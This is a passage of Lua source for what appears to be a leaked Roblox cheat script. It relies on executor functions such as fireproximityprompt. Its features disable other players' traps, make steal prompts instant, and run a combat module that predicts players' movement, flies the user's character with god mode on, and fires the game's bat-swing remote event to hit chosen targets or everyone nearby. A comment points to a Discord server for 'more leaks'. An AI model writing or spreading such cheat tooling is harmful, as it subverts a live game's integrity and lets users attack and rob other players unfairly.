		end

		local connection2 = localPlayer.CharacterAdded:Connect(function(character)
			if flag474 then
				task.defer(func414, character)
			end
		end)

		local obj61 = str1.OnHumanoidChanged(function()
			if flag474 and localPlayer.Character then
				func414(localPlayer.Character)
			end
		end)

		func4(function()
			flag474 = false
			connection2:Disconnect()
			obj61:Disconnect()
			func412()
		end)

		flag474 = true

		if localPlayer.Character then
			task.spawn(func414, localPlayer.Character)
		end
	end

	do
		local value371 = nil
		local flag475 = true
		local tbl233 = {}
		local tbl234 = {}

		local function func415(instance19)
			if instance19:IsA("BasePart") and tbl233[instance19] == nil then
				tbl233[instance19] = instance19.CanTouch

				pcall(function()
					instance19.CanTouch = false
				end)
			end
		end

		local function func416(instance20)
			if not flag475 or not instance20.Parent then
				return
			end
			local name = localPlayer.Name
			if instance20:GetAttribute("Owner") == name then
				return
			end
			func415(instance20)

			for _, descendant in ipairs(instance20:GetDescendants()) do
				func415(descendant)
			end

			table.insert(tbl234, instance20.DescendantAdded:Connect(function(descendant)
				if flag475 then
					func415(descendant)
				end
			end))
		end

		local function func417()
			for _, item107 in ipairs(CollectionService:GetTagged("PlacedTrap")) do
				func416(item107)
			end
		end

		local function func418()
			for k, value372 in pairs(tbl233) do
				if k.Parent then
					pcall(function()
						k.CanTouch = value372
					end)
				end
			end

			table.clear(tbl233)
		end

		table.insert(tbl234, CollectionService:GetInstanceAddedSignal("PlacedTrap"):Connect(function(param214)
			task.defer(func416, param214)
		end))

		value371 = obj51:CreateToggle({
			Name = "Anti Trap",
			Note = "Traps from other players cannot catch you",
			Default = true,
			Callback = function()
				flag475 = str1.Toggle(value371, true) == true

				if flag475 then
					func417()
				else
					func418()
				end
			end,
		})

		func417()

		func4(function()
			flag475 = false

			for _, item108 in ipairs(tbl234) do
				pcall(function()
					item108:Disconnect()
				end)
			end

			table.clear(tbl234)
			func418()
		end)
	end

	do
		local value373 = nil
		local str35 = "CarryAreaEgg"
		local byName4 = { ClaimLostPart = true }
		local tbl235 = {}
		local connection2 = nil
		local connection3 = nil

		local function func419(instance21)
			if not instance21:IsA("ProximityPrompt") or byName4[instance21.Name] then
				return
			end

			if tbl235[instance21] == nil then
				if instance21.HoldDuration <= 0 and instance21.Name ~= str35 then
					return
				end
				tbl235[instance21] = instance21.HoldDuration
			end

			if instance21.HoldDuration ~= 0 then
				pcall(function()
					instance21.HoldDuration = 0
				end)
			end
		end

		local function func420(instance22)
			if instance22.Name ~= "SmartPromptPart" then
				return nil
			end
			local carryAreaEgg = instance22:FindFirstChild("CarryAreaEgg")
			return carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and carryAreaEgg or nil
		end

		str1.PromptHold = function(obj)
			local entry20 = tbl235[obj]
			if type(entry20) == "number" then
				return entry20
			end
			return obj.HoldDuration
		end

		local function func421()
			if connection2 then
				return
			end

			connection3 = ProximityPromptService.PromptShown:Connect(function(param215)
				if str1.Toggle(value373, true) then
					func419(param215)
				end
			end)

			for _, child in ipairs(workspace:GetChildren()) do
				local value374 = func420(child)

				if value374 then
					func419(value374)
				end
			end

			connection2 = workspace.ChildAdded:Connect(function(child)
				if child.Name ~= "SmartPromptPart" then
					return
				end

				task.defer(function()
					local carryAreaEgg = child:FindFirstChild("CarryAreaEgg") or child:WaitForChild("CarryAreaEgg", 2)

					if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and str1.Toggle(value373, true) then
						func419(carryAreaEgg)
					end
				end)
			end)
		end

		local function func422()
			for k, value375 in pairs(tbl235) do
				if k and k.Parent then
					pcall(function()
						k.HoldDuration = value375
					end)
				end
			end

			table.clear(tbl235)

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		str1.PressStealPrompt = function(num100)
			if typeof(fireproximityprompt) ~= "function" or not num100 then
				return false
			end
			local value376 = nil
			local huge = math.huge

			for _, child in ipairs(workspace:GetChildren()) do
				local flag476 = func420(child)

				if flag476 and child:IsA("BasePart") then
					local magnitude = (child.Position - num100).Magnitude

					if magnitude < huge then
						value376 = flag476
						huge = magnitude
					end
				end
			end

			if not value376 or huge > 14 then
				return false
			end

			if str1.Toggle(value373, true) then
				pcall(function()
					value376.HoldDuration = 0
				end)
			end

			local ok = pcall(fireproximityprompt, value376)

			if ok and value376.HoldDuration > 0 then
				task.wait(value376.HoldDuration + 0.1)
			end

			return ok
		end

		tbl2.Add(function()
			if str1.Toggle(value373, true) then
				func421()

				for k in pairs(tbl235) do
					if not k.Parent then
						tbl235[k] = nil
					elseif k.HoldDuration ~= 0 then
						pcall(function()
							k.HoldDuration = 0
						end)
					end
				end
			elseif next(tbl235) ~= nil or connection2 then
				func422()
			end

			return false
		end)

		value373 = obj51:CreateToggle({
			Name = "Instant Prompts",
			Default = true,
			Callback = function()
				tbl2.Wake()
			end,
		})

		func4(func422)
	end

	str1.Combat = {}
	local combat
	combat = str1.Combat

	do
		local n20 = 15
		local n21 = 2
		local n22 = 0.05
		local n23 = 1
		local n24 = 0.18
		local n25 = -0.275
		local n26 = 0.6
		local n27 = 6
		local n28 = 1.1
		local n29 = 0.8
		local n30 = 2.5
		local n31 = 35
		local n32 = 0.12
		local n33 = 6
		local n34 = 6
		local n35 = 3
		local tbl236 = { 0.12, 0.2, 0.28, 0.36, 0.46, 0.6 }
		local byName5 = { ["WALL LEFT"] = true, ["WALL RIGHT"] = true }

		local tbl237 = {
			Trigger = nil,
			LastFire = 0,
			Trace = 0,
			EquipAt = 0,
			Walls = {},
			WallsAt = 0,
			WallSide = setmetatable({}, { __mode = "k" }),
			Tracks = setmetatable({}, { __mode = "k" }),
			Stats = {},
			Option = 3,
			Pending = {},
			Holders = {},
			SpawnRagdoll = nil,
		}

		for i = 1, #tbl236 do
			tbl237.Stats[i] = { Hits = 0, Shots = 0 }
		end

		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function func423()
			return workspace:GetServerTimeNow()
		end

		local function func424()
			local trigger = tbl237.Trigger
			if trigger and trigger.Parent then
				return trigger
			end
			local reBatSwingTrigger = networking:FindFirstChild("RE/BatSwing/Trigger")
			tbl237.Trigger = reBatSwingTrigger
			return reBatSwingTrigger
		end

		local function func425(obj62)
			return tonumber(obj62:GetAttribute("RagdollEndTime")) or 0
		end

		combat.SetLead = function(param216)
			n25 = math.clamp((tonumber(param216) or -275) / 1000, -0.4, 0.1)
		end

		combat.SetSweep = function(param217)
			n26 = math.clamp((tonumber(param217) or 60) / 100, 0, 2.5)
		end

		combat.Ragdolled = function(param218)
			return func425(param218) > func423()
		end

		combat.SelfRagdolled = function()
			local flag477 = func425(localPlayer)
			if flag477 <= func423() then
				return false
			end
			return flag477 ~= tbl237.SpawnRagdoll
		end

		combat.Humanoid = function(instance23)
			if not instance23 then
				return nil
			end
			local value377 = nil

			for _, child in ipairs(instance23:GetChildren()) do
				if child:IsA("Humanoid") then
					if child.Health > 0 then
						return child
					end
					value377 = value377 or child
				end
			end

			return value377
		end

		local function func426(obj63)
			local gears = tbl1.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local flag478 = type(directory) == "table"

			if flag478 then
				flag478 = directory[tostring(obj63:GetAttribute("GearName") or obj63.Name)]
			end

			flag478 = flag478 or nil
			local batControllerData = type(flag478) == "table" and flag478.BatControllerData or nil
			return type(batControllerData) == "table" and tonumber(batControllerData.RangeBonus) or 0
		end

		combat.Range = function(flag479)
			local n36 = workspace:GetAttribute("DragonEggEventActive") == true and 2.5 or 1
			return (n20 + n21 + (flag479 and func426(flag479) or 0)) * n36
		end

		combat.PickBat = function(obj64)
			local tool = obj64:FindFirstChildWhichIsA("Tool")
			if tool and str1.IsBatTool(tool) then
				return tool
			end
			local func427 = ipairs
			local tbl238 = { obj64, localPlayer:FindFirstChildOfClass("Backpack") }
			local n36 = -1
			local value378 = nil

			for _, value379 in func427(tbl238) do
				if value379 then
					for _, child in ipairs(value379:GetChildren()) do
						if str1.IsBatTool(child) then
							local flag480 = func426(child)

							if flag480 > n36 then
								n36 = flag480
								value378 = child
							end
						end
					end
				end
			end

			return value378
		end

		local function func428(parent, obj65, instance24)
			if instance24.Parent == parent then
				return true
			end
			local equipAt = tbl237.EquipAt
			if os.clock() - equipAt < 0.2 then
				return false
			end
			tbl237.EquipAt = os.clock()

			pcall(function()
				obj65:EquipTool(instance24)
			end)

			if instance24.Parent ~= parent then
				pcall(function()
					instance24.Parent = parent
				end)
			end

			return instance24.Parent == parent
		end

		combat.Parts = function(obj)
			local character = obj and obj.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
				return nil, nil
			end
			return character, humanoidRootPart
		end

		combat.Hittable = function(obj)
			if not obj or obj == localPlayer or obj.Parent ~= Players then
				return false
			end
			local obj66, value380 = combat.Parts(obj)
			if not obj66 then
				return false
			end

			if obj66:GetAttribute("IsTrapped") == true or obj:GetAttribute("InBossArena") then
				return false
			end
			return not str1.InsideBase(value380.Position)
		end

		local function func429()
			local wallsAt = tbl237.WallsAt
			if os.clock() < wallsAt then
				return tbl237.Walls
			end
			tbl237.WallsAt = os.clock() + 5
			local walls = {}
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Build")

			if world then
				for _, child in ipairs(world:GetChildren()) do
					local collisions = child:FindFirstChild("COLLISIONS")
					collisions = collisions and collisions:FindFirstChild("GUARD NO COLLIDE")

					if collisions then
						for _, child2 in ipairs(collisions:GetChildren()) do
							if byName5[child2.Name] then
								if child2:IsA("BasePart") then
									table.insert(walls, child2)
								end

								for _, descendant in ipairs(child2:GetDescendants()) do
									if descendant:IsA("BasePart") then
										table.insert(walls, descendant)
									end
								end
							end
						end
					end
				end
			end

			tbl237.Walls = walls
			return walls
		end

		local function func430(param219)
			if param219.X <= param219.Y and param219.X <= param219.Z then
				return "X", "Y", "Z"
			end

			if param219.Y <= param219.Z then
				return "Y", "X", "Z"
			end
			return "Z", "X", "Y"
		end

		local function func431(param220)
			local n36 = math.abs(param220.RightVector.Y)
			local n37 = math.abs(param220.UpVector.Y)
			local n38 = math.abs(param220.LookVector.Y)
			if n36 >= n37 and n36 >= n38 then
				return "X"
			end

			if n37 >= n38 then
				return "Y"
			end
			return "Z"
		end

		local function func432(tbl239, tbl240, flag481, param221)
			if flag481 == param221 then
				return true
			end
			local n36 = tbl240[flag481] + n33
			return math.abs(tbl239[flag481]) <= n36
		end

		local function func433(param222, param223)
			for _, item109 in ipairs(func429()) do
				if item109.Parent then
					local cFrame = item109.CFrame
					local size = item109.Size
					local value381, value382, value383 = func430(size)
					local value384 = func431(cFrame)
					local n36 = size / 2
					local tbl241 = cFrame:PointToObjectSpace(param223)

					if func432(tbl241, n36, value382, value384) and func432(tbl241, n36, value383, value384) then
						local tbl242 = cFrame:PointToObjectSpace(param222)
						local n37 = math.abs(tbl242[value381])
						local n38 = tbl237.WallSide[item109]

						if n37 >= n36[value381] + n33 * 0.5 or n38 == nil and n37 >= n36[value381] then
							n38 = tbl242[value381] >= 0 and 1 or -1
							tbl237.WallSide[item109] = n38
						elseif n38 == nil then
							n38 = tbl242[value381] >= 0 and 1 or -1
						end

						local n39 = n36[value381] + n33

						if tbl241[value381] * n38 < n39 then
							local tbl243 = { X = tbl241.X, Y = tbl241.Y, Z = tbl241.Z, [value381] = n38 * n39 }
							param223 = cFrame:PointToWorldSpace(Vector3.new(tbl243.X, tbl243.Y, tbl243.Z))
						end
					end
				end
			end

			return param223
		end

		combat.KeepOffWalls = function(num101, param224)
			local num102 = func433(num101, param224)
			local n36 = num102 - num101

			if n33 < n36.Magnitude then
				local value385 = num101

				for i = 1, 6 do
					local n37 = num101 + n36 * i / n34
					local num103 = func433(value385, n37)
					if (num103 - n37).Magnitude > 0.01 then
						return func433(num101, num103)
					end
					value385 = num103
				end
			end

			return num102
		end

		combat.ResetWalls = function()
			table.clear(tbl237.WallSide)
		end

		local n36 = 0
		local value386 = nil

		local function func434(num104)
			local character = localPlayer.Character

			if os.clock() - n36 > 0.5 or character ~= value386 then
				n36 = os.clock()
				value386 = character
				local filterDescendantsInstances = {}

				for _, player in ipairs(Players:GetPlayers()) do
					if player.Character then
						table.insert(filterDescendantsInstances, player.Character)
					end
				end

				raycastParams.FilterDescendantsInstances = filterDescendantsInstances
			end

			local hit = workspace:Raycast(num104 + Vector3.new(0, 60, 0), Vector3.new(0, -400, 0), raycastParams)
			if hit and num104.Y < hit.Position.Y + n35 then
				return Vector3.new(num104.X, hit.Position.Y + n35, num104.Z)
			end
			return num104
		end

		local function func435(param225, part19)
			local flag482 = tbl237.Tracks[param225]

			if not flag482 then
				local tbl244 = { Samples = {}, Smooth = nil, Heading = nil }
				tbl237.Tracks[param225] = tbl244
				flag482 = tbl244
			end

			local now = os.clock()
			local samples = flag482.Samples
			table.insert(samples, { Time = now, Position = part19.Position })

			while #samples > 2 and now - samples[1].Time > n32 do
				table.remove(samples, 1)
			end

			local assemblyLinearVelocity = part19.AssemblyLinearVelocity
			local first5 = samples[1]
			local n37 = now - first5.Time
			local value387

			if n37 >= 0.03 then
				local n38 = (part19.Position - first5.Position) / n37

				if n38.Magnitude <= 1500 and assemblyLinearVelocity.Magnitude <= n38.Magnitude * 1.4 then
					value387 = n38
				else
					value387 = assemblyLinearVelocity
				end
			else
				value387 = assemblyLinearVelocity
			end

			local vector = Vector3.new(value387.X, 0, value387.Z)
			flag482.Smooth = flag482.Smooth and flag482.Smooth:Lerp(vector, 0.25) or vector
			local smooth = flag482.Smooth

			if smooth.Magnitude > 1 then
				local heading = flag482.Heading and flag482.Heading:Lerp(smooth.Unit, 0.25) or smooth.Unit
				flag482.Heading = heading.Magnitude > 0.01 and heading.Unit or smooth.Unit
			end

			return value387, vector, smooth, flag482
		end

		local function func436()
			local n37 = 0

			for _, stat in ipairs(tbl237.Stats) do
				n37 += stat.Shots
			end

			local option = tbl237.Option
			local n38 = -math.huge

			for i, stat in ipairs(tbl237.Stats) do
				local n39 = stat.Shots + 1
				local n40 = (stat.Hits + 1) / (stat.Shots + 2) + math.sqrt(2 * math.log(n37 + 2) / n39) * 0.35

				if n40 > n38 then
					n38 = n40
					option = i
				end
			end

			tbl237.Option = option
			return option
		end

		local function func437()
			local now = os.clock()

			for i = #tbl237.Pending, 1, -1 do
				local num105 = tbl237.Pending[i]
				local value388 = tbl237.Stats[num105.Option]

				if num105.RagdollBefore + 0.01 < func425(num105.Target) then
					value388.Hits = value388.Hits + 1
					value388.Shots = value388.Shots + 1
					table.remove(tbl237.Pending, i)
				elseif num105.Wait < now - num105.At then
					if (num105.Tool and tonumber(num105.Tool:GetAttribute("CooldownEndTime")) or 0) > num105.CooldownBefore + 0.01 then
						value388.Shots = value388.Shots + 1
					end

					table.remove(tbl237.Pending, i)
				end
			end
		end

		combat.Plan = function(flag483, part20, part21, flag484)
			if not part21 then
				local value389
				value389, part21 = combat.Parts(flag483)
			end

			if not part21 or not part21.Parent then
				return nil
			end
			local n37 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n38 = math.clamp(n37 + n22, 0.05, 0.35)
			local num106, value390, num107, value391 = func435(flag483 or part21, part21)
			local result83 = func436()
			local entry21 = tbl236[result83]
			local position = part21.Position
			local n39 = position + num106 * math.max(0, entry21 + n37 - n38)
			local n40 = position + num106 * (entry21 + n37)
			local magnitude = num107.Magnitude
			local heading = value391.Heading

			if not heading then
				local vector = Vector3.new(part20.Position.X - position.X, 0, part20.Position.Z - position.Z)
				heading = vector.Magnitude > 0.1 and vector.Unit or Vector3.new(0, 0, 1)
			end

			local character = localPlayer.Character
			local num108 = combat.Range(character and combat.PickBat(character) or nil)
			local n41 = position + num107 * (n37 + entry21 + n24 + n25) + (magnitude > 1 and num107.Unit * n27 * n26 or Vector3.zero)
			local n42 = math.max(5, math.min(num108 * 0.7, 6 + magnitude * 0.07)) * n26
			local now = os.clock()
			local n43 = (math.sin(now * 2 * 3.1415926535897931 / n28) * 0.5 + 0.5) * n42
			local n44 = math.sin(now * 2 * 3.1415926535897931 / n29) * n30
			local vector = Vector3.new(-heading.Z, 0, heading.X)

			if vector:Dot(part20.Position - n41) < 0 then
				vector = -vector
			end

			local n45 = n41 + heading * n43 + vector * (value390.Magnitude < n31 and 3 or 1.5) + Vector3.new(0, n44, 0)
			local position2 = part20.Position

			if not flag484 then
				position2 = combat.KeepOffWalls(part20.Position, func434(Vector3.new(n45.X, n45.Y, position.Z)))
			end
			-- more leaks: https://discord.gg/x7YbZeezpm

			return {
				Goal = position2,
				Velocity = Vector3.new(num107.X, 0, num107.Z),
				Face = n40,
				Current = n40,
				Historical = n39,
				Option = result83,
				Distance = (position - part20.Position).Magnitude,
			}
		end

		combat.Steer = function(obj, param226, num109, param227, param228)
			local n37 = math.max(param228, 0.0041666666666666666)
			local velocity = param226.Velocity
			local n38 = velocity + (param226.Goal - obj.Position) / math.max(0.12, n37)
			local n39 = math.min(num109 + velocity.Magnitude, param227)

			if n39 < n38.Magnitude then
				n38 = n38.Unit * n39
			end

			local position = obj.Position
			local n40 = position + n38 * n37
			local num110 = combat.KeepOffWalls(position, n40)

			if (num110 - n40).Magnitude > 0.01 then
				n38 = (num110 - position) / n37
			end

			local num111 = combat.KeepOffWalls(position, position)

			if (num111 - position).Magnitude > 0.01 then
				n38 = (num111 - position) / math.max(0.12, n37)
			end

			local assemblyLinearVelocity = n38 + Vector3.new(0, workspace.Gravity * n37 * 0.5, 0)

			pcall(function()
				local vector = Vector3.new(param226.Face.X - position.X, 0, param226.Face.Z - position.Z)

				if vector.Magnitude > 0.05 then
					obj.CFrame = CFrame.lookAt(position, position + vector.Unit)
				end

				obj.AssemblyLinearVelocity = assemblyLinearVelocity
				obj.AssemblyAngularVelocity = Vector3.zero
			end)
		end

		combat.TryHit = function(obj, flag485)
			func437()
			if workspace:GetAttribute("PvPDisabled") == true then
				return "Player hits are off right now"
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local flag486 = combat.Humanoid(character)
			if not humanoidRootPart or not flag486 or flag486.Health <= 0 then
				return "Waiting for your character"
			end
			local obj67 = combat.PickBat(character)
			if not obj67 then
				return "No bat found"
			end

			if not func428(character, flag486, obj67) then
				return "Equipping " .. tostring(obj67:GetAttribute("GearName") or obj67.Name)
			end

			if not combat.Hittable(obj) or combat.Ragdolled(obj) then
				return nil
			end
			flag485 = flag485 or combat.Plan(obj, humanoidRootPart)
			if not flag485 then
				return nil
			end
			local n37 = combat.Range(obj67) - n23
			local n38 = humanoidRootPart.Position - humanoidRootPart.AssemblyLinearVelocity * n24
			if (flag485.Historical - n38).Magnitude > n37 and (flag485.Current - n38).Magnitude > n37 then
				return nil
			end
			local result84 = func424()
			if not result84 then
				return nil
			end
			local n39 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n40 = tonumber(obj67:GetAttribute("CooldownEndTime")) or 0
			if func423() < n40 - n39 * 0.5 then
				return nil
			end
			local lastFire = tbl237.LastFire
			if os.clock() - lastFire < math.max(0.12, n39 * 1.5) then
				return nil
			end
			tbl237.LastFire = os.clock()
			tbl237.Trace = tbl237.Trace + 1

			table.insert(tbl237.Pending, {
				Target = obj,
				Option = flag485.Option,
				At = os.clock(),
				Wait = math.max(0.5, n39 * 2 + 0.3),
				RagdollBefore = func425(obj),
				CooldownBefore = n40,
				Tool = obj67,
			})

			local formatted15 = string.format("%d:%d:%d", localPlayer.UserId, tbl237.Trace, math.floor(func423() * 1000))

			pcall(function()
				result84:FireServer(obj, formatted15)
			end)

			return "Hitting " .. obj.DisplayName
		end

		combat.ReadyBat = function()
			local character = localPlayer.Character
			local flag487 = combat.Humanoid(character)
			if not character or not flag487 or flag487.Health <= 0 then
				return false
			end
			local flag488 = combat.PickBat(character)
			return flag488 ~= nil and func428(character, flag487, flag488)
		end

		combat.Swing = function()
			if str1.Steal.Active or str1.Steal.Carrying then
				return false
			end
			local lastFire = tbl237.LastFire
			local startTime = os.clock() - lastFire < 0.3
			local flag489

			if startTime then
				flag489 = startTime
			else
				flag489 = os.clock() - (tbl237.LastSwing or 0) < 0.15
			end

			if flag489 then
				return false
			end
			local character = localPlayer.Character
			local flag490 = combat.Humanoid(character)
			if not character or not flag490 or flag490.Health <= 0 then
				return false
			end
			local obj68 = combat.PickBat(character)
			if not obj68 or not func428(character, flag490, obj68) then
				return false
			end
			tbl237.LastSwing = os.clock()

			pcall(function()
				obj68:Activate()
			end)

			return true
		end

		combat.HolderOf = function(childName15)
			local obj69 = workspace:FindFirstChild(childName15)
			if not obj69 then
				return nil
			end

			for _, descendant in ipairs(obj69:GetDescendants()) do
				if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
					local ok, result, result2 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok then
						for _, item110 in ipairs({ result, result2 }) do
							if typeof(item110) == "Instance" and not item110:IsDescendantOf(obj69) then
								local model = item110:FindFirstAncestorOfClass("Model")

								if model then
									model = Players:GetPlayerFromCharacter(model) or Players:FindFirstChild(model.Name)
								end

								local obj70 = model or nil
								if obj70 and obj70 ~= localPlayer and obj70:IsA("Player") then
									return obj70
								end
							end
						end
					end
				end
			end

			return nil
		end

		task.spawn(function()
			while not str1.CombatDisposed do
				local holders = {}

				if str1.CombatWantsHolders then
					local eggState = tbl1.EggState

					if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
						local ok, result = pcall(eggState.ReadFieldEggs)
						local records = ok and type(result) == "table" and result.Records or nil

						if type(records) == "table" then
							for _, record in pairs(records) do
								if type(record) == "table" and record.State == "Carried" and type(record.Uid) == "string" then
									local value392 = combat.HolderOf(record.Uid)

									if value392 then
										holders[value392] = true
									end
								end
							end
						end
					end
				end

				tbl237.Holders = holders
				task.wait(0.3)
			end
		end)

		combat.IsHolder = function(param229)
			return tbl237.Holders[param229] == true
		end

		local tbl245 = {}

		combat.OnNewLife = function(param230)
			table.insert(tbl245, param230)
		end

		local function func438()
			table.clear(tbl237.Pending)
			tbl237.LastFire = 0
			tbl237.LastSwing = 0
			tbl237.EquipAt = 0
			table.clear(tbl237.Tracks)
			table.clear(tbl237.WallSide)
			tbl237.SpawnRagdoll = func425(localPlayer)

			for _, item111 in ipairs(tbl245) do
				pcall(item111)
			end
		end

		local characterAdded = localPlayer.CharacterAdded
		local connect = characterAdded.Connect
		local tbl246 = { localPlayer.CharacterRemoving:Connect(func438), connect(characterAdded, func438) }

		func4(function()
			str1.CombatDisposed = true

			for _, item112 in ipairs(tbl246) do
				pcall(function()
					item112:Disconnect()
				end)
			end
		end)
	end

	do
		local combat2 = str1.Combat
		local tbl247 = { "Nearest", "Egg Holders", "Specific Player" }
		local n20 = 0.7
		local str36 = "No other players"

		local tbl248 = {
			Handles = {},
			AuraHandle = nil,
			Row = nil,
			Picker = nil,
			TargetMode = tbl247[1],
			Picked = nil,
			LabelToName = {},
			Speed = 400,
			MaxSpeed = 750,
			Target = nil,
			Plan = nil,
			Moving = false,
			Status = "Idle",
			Shown = nil,
			NamesDirty = true,
		}

		local function func439()
			for i, item113 in ipairs(tbl247) do
				if str1.Toggle(tbl248.Handles[i], false) then
					return item113
				end
			end

			return nil
		end

		local function func440()
			return str1.Toggle(tbl248.AuraHandle, false) == true
		end

		str1.CombatActive = function()
			return func439() ~= nil or func440()
		end

		local function func441(param231)
			if not combat2.Hittable(param231) then
				return false
			end

			if tbl248.TargetMode == tbl247[2] then
				return combat2.IsHolder(param231)
			end

			if tbl248.TargetMode == tbl247[3] then
				return tbl248.Picked ~= nil and param231.Name == tbl248.Picked
			end
			return true
		end

		local function func442(num112)
			local target = tbl248.Target
			local magnitude

			if target and func441(target) then
				local value393, value394 = combat2.Parts(target)
				magnitude = (value394.Position - num112).Magnitude
			else
				magnitude = math.huge
				target = nil
			end

			local huge = math.huge
			local value395 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= target and func441(player) and not combat2.Ragdolled(player) then
					local value396, value397 = combat2.Parts(player)
					local magnitude2 = (value397.Position - num112).Magnitude

					if magnitude2 < huge then
						huge = magnitude2
						value395 = player
					end
				end
			end

			if target then
				if value395 and not combat2.Ragdolled(target) and huge < magnitude * n20 then
					return value395
				end
				return target
			end

			return value395
		end

		local function func443(num113, flag491)
			local value398 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local character = player.Character
					local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local magnitude = (humanoidRootPart.Position - num113).Magnitude

						if magnitude < flag491 and combat2.Hittable(player) and not combat2.Ragdolled(player) then
							flag491 = magnitude
							value398 = player
						end
					end
				end
			end

			return value398, flag491
		end

		local function func444()
			tbl248.Plan = nil

			if tbl248.Moving then
				tbl248.Moving = false
				str1.EndFlight()
				str1.GodMode(false)
				str1.Shield("combat", false)
				combat2.ResetWalls()
			end

			str1.ReleaseMovement("combat")
		end

		combat2.OnNewLife(function()
			tbl248.AuraVictim = nil
			tbl248.Target = nil
			tbl248.Plan = nil
			pcall(func444)
		end)

		local function func445()
			local movement = str1.Movement
			return str1.Steal.Active or str1.Steal.Carrying or str1.Steal.Wanted and str1.Toggle(value2, false) or movement.Owner ~= nil and movement.Owner ~= "combat" and movement.Owner ~= "treadmill"
		end

		local function func446(part22)
			local character = localPlayer.Character
			local n21 = combat2.Range(character and combat2.PickBat(character) or nil) + 6
			local str37, flag492 = func443(part22.Position, n21 + 24)

			if not str37 or flag492 > n21 then
				tbl248.AuraVictim = nil

				if str37 then
					combat2.ReadyBat()
				end

				tbl248.Status = "Aura ready, nobody in reach"
				return
			end

			tbl248.AuraVictim = str37
			tbl248.Status = combat2.TryHit(str37, combat2.Plan(str37, part22, nil, true)) or "Aura on " .. str37.DisplayName
		end

		local function func447()
			local result85 = func439()

			if result85 and result85 ~= tbl248.TargetMode then
				tbl248.TargetMode = result85
				tbl248.Target = nil
			end

			str1.CombatWantsHolders = result85 == tbl247[2]
			local result86 = func440()
			local flag493 = not result85

			if flag493 then
				if tbl248.Target or tbl248.Moving then
					tbl248.Target = nil
					func444()
				end
			end

			if flag493 and not result86 then
				tbl248.Status = "Idle"
				return
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local flag494 = combat2.Humanoid(character)

			if not humanoidRootPart or not flag494 or flag494.Health <= 0 then
				tbl248.Target = nil
				func444()
				tbl248.Status = "Waiting for your character"
				return
			end

			if flag493 then
				func446(humanoidRootPart)
				return
			end
			local position6 = func442(humanoidRootPart.Position)
			tbl248.Target = position6

			if not position6 then
				func444()
				if result86 then
					func446(humanoidRootPart)
					return
				end
				tbl248.Status = result85 == tbl247[2] and "Waiting for someone to hold an egg" or result85 == tbl247[3] and "Picked player is not reachable" or "No player to hit"
				return
			end

			local plan = combat2.Plan(position6, humanoidRootPart)
			local flag495 = result85 ~= tbl247[2]

			if not func445() and (flag495 or not combat2.SelfRagdolled()) and str1.ClaimMovement("combat") and not str1.AntiGuard.Busy then
				if not tbl248.Moving then
					tbl248.Moving = true
					str1.Shield("combat", true)
					str1.GodMode(true)
					str1.BeginFlight()
				end

				str1.GodTick()
				tbl248.Plan = plan
			else
				if tbl248.Moving then
					func444()
				end

				tbl248.Plan = nil
			end

			local str38 = combat2.TryHit(position6, plan, flag495)
			plan = plan and math.floor(plan.Distance + 0.5) or 0

			if str38 then
				tbl248.Status = str38 .. string.format("  %d studs", plan)
			elseif func445() then
				tbl248.Status = string.format("Waiting for Auto Steal, near %s", position6.DisplayName)
			else
				tbl248.Status = string.format("Chasing %s  %d studs", position6.DisplayName, plan)
			end
		end

		local function func448()
			local tbl249 = {}

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(tbl249, player)
				end
			end

			table.sort(tbl249, function(player2, player3)
				return string.lower(player2.DisplayName) < string.lower(player3.DisplayName)
			end)

			local tbl250 = {}

			for _, item114 in ipairs(tbl249) do
				tbl250[item114.DisplayName] = (tbl250[item114.DisplayName] or 0) + 1
			end

			local tbl251 = {}
			local tbl252 = {}

			for _, item115 in ipairs(tbl249) do
				local displayName = item115.DisplayName

				if tbl250[displayName] > 1 then
					displayName = string.format("%s (@%s)", item115.DisplayName, item115.Name)
				end

				table.insert(tbl251, displayName)
				tbl252[displayName] = item115.Name
			end

			if #tbl251 == 0 then
				tbl251[1] = str36
			end

			return tbl251, tbl252
		end

		local function func449(param232)
			for k, value399 in pairs(tbl248.LabelToName) do
				if value399 == param232 then
					return k
				end
			end

			return nil
		end

		local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
			local plan = tbl248.Plan
			if not plan or not tbl248.Moving then
				return
			end
			local value400 = str1.Root()

			if value400 then
				combat2.Steer(value400, plan, tbl248.Speed, math.max(tbl248.Speed, tbl248.MaxSpeed), deltaTime)
			end
		end)

		local n21 = 0.05
		local n22 = 0

		local connection3 = RunService.Heartbeat:Connect(function()
			local flag496 = func439() ~= nil
			local result87 = func440()

			if not result87 then
				tbl248.AuraVictim = nil
			end

			local now = os.clock()

			if flag496 or not result87 or now >= n22 then
				if result87 and not flag496 then
					n22 = now + n21
				end

				if not pcall(func447) then
					tbl248.Status = "Retrying"
				end
			end

			if flag496 or result87 and tbl248.AuraVictim ~= nil then
				pcall(combat2.Swing)
			end

			local row = tbl248.Row

			if row and tbl248.Shown ~= tbl248.Status and type(row.Set) == "function" then
				tbl248.Shown = tbl248.Status
				pcall(row.Set, row, tbl248.Status)
			end
